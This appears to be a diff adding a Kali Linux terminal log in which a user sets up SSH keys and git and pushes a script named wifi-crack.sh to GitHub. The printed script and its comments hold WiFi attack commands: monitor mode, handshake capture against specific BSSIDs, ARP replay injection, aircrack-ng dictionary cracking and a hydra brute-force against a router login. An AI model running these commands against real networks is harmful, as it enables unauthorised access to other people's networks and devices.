@@ -1,0 +1,189 @@
+root@kali:~# man ssh-keygen
+root@kali:~# man ssh-keygen
+root@kali:~# cd /home/msh/
+root@kali:/home/msh# ls
+dont-panic  git-code  pratice-tmp  wifi-crack
+root@kali:/home/msh# cd git-code/
+root@kali:/home/msh/git-code# ls
+algorithm-master
+root@kali:/home/msh/git-code# cd github-local
+bash: cd: github-local: No such file or directory
+root@kali:/home/msh/git-code# mkdir github-local
+root@kali:/home/msh/git-code# cd github-local/
+root@kali:/home/msh/git-code/github-local# ssh-keygen -t rsa -C "mshmayoushi@gmail.com"
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa):
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+nYour identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+2b:af:dc:fb:ab:7f:32:62:1a:64:0f:90:cc:1e:88:15 mshmayoushi@gmail.com
+The key's randomart image is:
++---[RSA 2048]----+
+|  E.             |
+| o + .           |
+|. . *            |
+|   . o           |
+|    . + S        |
+|     o o .       |
+|      o o        |
+|     . =o o .    |
+|      ++=*+=     |
++-----------------+
+root@kali:/home/msh/git-code/github-local# cd /root/.s
+.ssh/        .subversion/
+root@kali:/home/msh/git-code/github-local# cd /root/.ssh/
+root@kali:~/.ssh# ls
+id_rsa  id_rsa.pub  known_hosts
+root@kali:~/.ssh# emacs
+root@kali:~/.ssh# git config --global user.name "msh"
+root@kali:~/.ssh# cd /home/msh/git-code/github-local/
+root@kali:/home/msh/git-code/github-local# git config --global user.email "mshmayoushi@gmail.com"
+root@kali:/home/msh/git-code/github-local# man git
+root@kali:/home/msh/git-code/github-local# git-init
+bash: git-init: command not found
+root@kali:/home/msh/git-code/github-local# git init
+Initialized empty Git repository in /home/msh/git-code/github-local/.git/
+root@kali:/home/msh/git-code/github-local# ls -a
+.  ..  .git
+root@kali:/home/msh/git-code/github-local# man git
+root@kali:/home/msh/git-code/github-local# git remote add kali git@github.com:mshmyw/kali.git
+root@kali:/home/msh/git-code/github-local# git remote -v
+kali	git@github.com:mshmyw/kali.git (fetch)
+kali	git@github.com:mshmyw/kali.git (push)
+root@kali:/home/msh/git-code/github-local# cp ../github-local/.git/
+branches/    config       description  HEAD         hooks/       info/        objects/     refs/
+root@kali:/home/msh/git-code/github-local# cp ../../wifi-crack/wi
+wifi-crack.sh               win10-360-01.csv            win10-360-01.kismet.netxml
+win10-360-01.cap            win10-360-01.kismet.csv
+root@kali:/home/msh/git-code/github-local# cp ../../wifi-crack/wifi-crack.sh .
+root@kali:/home/msh/git-code/github-local# ls
+wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# ls -a
+.  ..  .git  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git add .
+root@kali:/home/msh/git-code/github-local# git add wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git commit -m "wifi crack shell bash"
+[master (root-commit) dad7835] wifi crack shell bash
+ 1 file changed, 23 insertions(+)
+ create mode 100755 wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git push kali master
+ERROR: Repository not found.
+fatal: Could not read from remote repository.
+
+Please make sure you have the correct access rights
+and the repository exists.
+root@kali:/home/msh/git-code/github-local# git remote -v
+kali	git@github.com:mshmyw/kali.git (fetch)
+kali	git@github.com:mshmyw/kali.git (push)
+root@kali:/home/msh/git-code/github-local# git push kali master
+To git@github.com:mshmyw/kali.git
+ ! [rejected]        master -> master (fetch first)
+error: failed to push some refs to 'git@github.com:mshmyw/kali.git'
+hint: Updates were rejected because the remote contains work that you do
+hint: not have locally. This is usually caused by another repository pushing
+hint: to the same ref. You may want to first integrate the remote changes
+hint: (e.g., 'git pull ...') before pushing again.
+hint: See the 'Note about fast-forwards' in 'git push --help' for details.
+root@kali:/home/msh/git-code/github-local# git pull kali master
+warning: no common commits
+remote: Counting objects: 3, done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+Unpacking objects: 100% (3/3), done.
+From github.com:mshmyw/kali
+ * branch            master     -> FETCH_HEAD
+ * [new branch]      master     -> kali/master
+Merge made by the 'recursive' strategy.
+ README.md | 2 ++
+ 1 file changed, 2 insertions(+)
+ create mode 100644 README.md
+root@kali:/home/msh/git-code/github-local# git pull kali master
+From github.com:mshmyw/kali
+ * branch            master     -> FETCH_HEAD
+Already up-to-date.
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# cat README.md
+# kali
+kali linux,security,exploit, python,lua
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git status
+On branch master
+nothing to commit, working directory clean
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git add wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git commit -m "wifi-crack"
+On branch master
+nothing to commit, working directory clean
+root@kali:/home/msh/git-code/github-local# git commit -m "wifi-crack" wifi-crack.sh
+On branch master
+nothing to commit, working directory clean
+root@kali:/home/msh/git-code/github-local# cat wifi-crack.sh
+#!/bin/bash
+
+WLAN=wlan0mon
+echo "start airemon..."
+# airmon-ng start $WLAN
+
+ifconfig $WLAN down
+iwconfig $WLAN mode monitor
+ifconfig $WLAN up
+iwconfig $WLAN
+
+echo "start airodump-ng..."
+# airodump-ng $WLAN
+# airodump-ng -w win10-360 -c 6 --bssid 8C:A9:82:47:87:9B $WLAN --ignore-negative-one
+# aircrack-ng -w password.txt --bssid 8C:A9:82:47:87:9B win10-msh-01.cap
+# 5C:63:BF:4D:E0:DA  -61       33        6    0   4  54e. WPA2 CCMP   PSK  TP-LINK_B1-106-Left
+# D8:15:0D:30:1D:1C  -48        8       21    5  11  54e. WPA2 CCMP   PSK  B1-302
+
+# aircrack-ng -w pass-dict/8-bits.lst win10-360-01.cap
+# BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+# D8:15:0D:30:1D:1C  00:36:76:10:98:9D   -1    2e- 0      0      990
+# aireplay-ng -3 -b D8:15:0D:30:1D:1C -h 38:59:F9:DF:2B:1F wlan0mon //arprequest injection
+# hydra -l admin -P pass-dict/8bits.lst -f -V -e nsr -t 1 192.168.1.1 http-get /
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git push kali wifi-crack.sh
+error: src refspec wifi-crack.sh does not match any.
+error: failed to push some refs to 'git@github.com:mshmyw/kali.git'
+root@kali:/home/msh/git-code/github-local# ls -l
+total 8
+-rw-r--r-- 1 root root  47 Oct 23 13:24 README.md
+-rwxr-xr-x 1 root root 927 Oct 23 13:16 wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git add wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git commit -m "wifi-crack.sh"
+On branch master
+nothing to commit, working directory clean
+root@kali:/home/msh/git-code/github-local# git clean
+fatal: clean.requireForce defaults to true and neither -i, -n, nor -f given; refusing to clean
+root@kali:/home/msh/git-code/github-local# git fetch kali
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# git commit -m "wifi-crack.sh"
+On branch master
+nothing to commit, working directory clean
+root@kali:/home/msh/git-code/github-local# git status wifi-crack.sh
+On branch master
+nothing to commit, working directory clean
+root@kali:/home/msh/git-code/github-local# git push kali master
+Warning: Permanently added the RSA host key for IP address '192.30.252.128' to the list of known hosts.
+Counting objects: 5, done.
+Delta compression using up to 4 threads.
+Compressing objects: 100% (4/4), done.
+Writing objects: 100% (5/5), 1.01 KiB | 0 bytes/s, done.
+Total 5 (delta 0), reused 0 (delta 0)
+To git@github.com:mshmyw/kali.git
+   937d501..33356a2  master -> master
+root@kali:/home/msh/git-code/github-local# ls
+README.md  wifi-crack.sh
+root@kali:/home/msh/git-code/github-local# vim git-process.txt
+root@kali:/home/msh/git-code/github-local#
+# all do it.
